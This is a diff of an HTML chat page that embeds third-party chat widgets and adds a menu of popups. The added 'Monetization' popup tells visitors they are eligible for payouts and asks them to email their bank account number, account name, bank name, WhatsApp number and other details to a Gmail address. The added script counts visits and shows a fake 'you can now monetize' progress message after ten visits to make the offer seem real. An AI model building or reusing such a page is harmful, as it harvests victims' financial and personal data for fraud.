@@ -4,31 +4,143 @@
     <meta charset="UTF-8">
     
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=no"> 
-    
+  <script src="main.js"></script>  
     
     <title>Page title</title>
+
+<link rel="stylesheet" href="main.css">
+
 </head>
 <body>
  
- 
- <style>
+  <style>
      body {
-         background:black;
+         background:white;
+     }
+     a {
+         text-decoration:none;
      }
  </style>
 
 
 
-<main style="margin-top:10px;"> 
- 
- 
- 
+
+
  <div style="width:100%; height:100%; position:fixed;top:0%;right:0%;"><div id="rt-ddbf6678869d80608818cf3b5b926dfd"></div> <script src="https://rumbletalk.com/client/?5flzMDXL"></script></div>
  
- 
- 
- 
+
+
  <div style="background:#8DB600; position: fixed;width:40%; height:50px;right:0%; top:0%;box-sizing:border-shadow;"></div>
+
+
+
+
+
+
+
+<div class="navigation">
+ <div style="font-size:23px;font-weight:bold;" class="menu-toggle">    
+
+&#x22EE
+ 
+ </div>
+  <div class="menu">
+   <a href="index.html"><div style="font-size:15px position:fixed;top:12%;right:40%; background:red;color:white;width:25%; height:35px;border-radius:1px;border:none; outline:none;text-align: center;">X</div></a>  
+    
+    
+    <h4 class="nav-link home">VIP group</h4>
+    <h4 class="nav-link about">About</h4>
+    <h4 class="nav-link settings">Settings ⚙️</h4>
+    <h4 class="nav-link status">Status</h4>
+    <h4 class="nav-link monetization">Monetization</h4>
+  </div>
+</div>
+
+<div class="popup home">
+  
+  <iframe src="http://tycommvipgroup.chatango.com/"style="width:100%; height:100%; position:fixed;top:0%;left:0%;"></iframe>  
+   
+  
+  
+  <button class="cancel">Cancel</button>
+</div>
+<div class="popup about">
+  <iframe src="about.html"></iframe>
+  <button class="cancel">Cancel</button>
+</div>
+<div class="popup settings">
+  <iframe src="settings.html"></iframe>
+  <button class="cancel">Cancel</button>
+</div>
+<div class="popup status">
+  <iframe src="status.html"></iframe>
+  <button class="cancel">Cancel</button>
+</div>
+<div class="popup monetization">
+ 
+ <div style="text-align: center;color:white;font-family:monospace;font-weight:bold;font-size:20px;padding:10px;">Monetization Policy</div>
+ 
+  
+  <h4 style="font-family:monospace;font-size:14px;text-align: center;"> Dear honourable! You are now eligible for monetization, kindly send This credentials stated below to this Email address: tycooninfinity@gmail.com                                                 
+  
+  Guest name, Data-sub number, Network, Whatsapp number, account number, account name, bank name.              please make sure you entered the correct credentials and text it to the email above </h4>
+  
+ </br> 
+  
+<input id="text" value="tycooninfinity@gmail.com">
+<p style="font-size:11px;background:blue;width:30%;height:5%;border-radius:5px;" onclick="copyText()">📎 Copy email</p>
+
+
+</br></br>
+
+
+  
+  <div class="progress-bar"></div>
+  <p class="status-text"></p>
+  <button class="cancel">Cancel</button>
+</div>
+
+<div class="popup-message">Congratulations! You can now monetize, go to monetization for more.</div>
+
+
+
+
+
+
+
+
+ 
+  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+  
+ 
+ 
+ 
+ 
+ 
+ 
+ <!-- <div class="menu-toggle"> 
+  <span></span>
+  <span></span>
+  <span></span>
+</div>
+ -->
+ 
+ 
  
  
  
@@ -41,8 +153,8 @@
  
  
     
- <a href="next.html"><div style="font-size:30px;height:10%;color:white; position:fixed;top:0%;right:7%;">&#9777</div></a>    
-
+ <!-- <a href="next.html"><div style="font-size:30px;height:10%;color:white; position:fixed;top:0%;right:7%;">&#9777</div></a>    
+ -->
 
 
 
@@ -54,3 +166,66 @@
     
 </body>
 </html>
+
+
+
+
+
+
+
+
+<script>
+              
+ 
+const menuToggle = document.querySelector('.menu-toggle');
+const menu = document.querySelector('.menu');
+const navLinks = document.querySelectorAll('.nav-link');
+const popups = document.querySelectorAll('.popup');
+const cancelButton = document.querySelectorAll('.cancel');
+const progressBar = document.querySelector('.progress-bar');
+const statusText = document.querySelector('.status-text');
+const popupMessage = document.querySelector('.popup-message');
+
+let visitCount = localStorage.getItem('visitCount') || 0;
+visitCount++;
+localStorage.setItem('visitCount', visitCount);
+
+if (visitCount >= 10) {
+  progressBar.style.width = '100%';
+  statusText.textContent = 'You can now monetize your account ✔️';
+  popupMessage.style.display = 'block';
+  setTimeout(() => {
+    popupMessage.style.display = 'none';
+  }, 5000);
+}
+
+menuToggle.addEventListener('click', () => {
+  menu.style.display = 'block';
+});
+
+navLinks.forEach((navLink, index) => {
+  navLink.addEventListener('click', () => {
+    popups[index].style.display = 'block';
+  });
+});
+
+cancelButton.forEach((button) => {
+  button.addEventListener('click', () => {
+    popups.forEach((popup) => {
+      popup.style.display = 'none';
+    });
+  });
+});  
+    
+</script>
+
+
+<script>
+function copyText() {
+document.getElementById('text').select();
+document.execCommand('copy');
+}
+  
+ </script> 
+
+
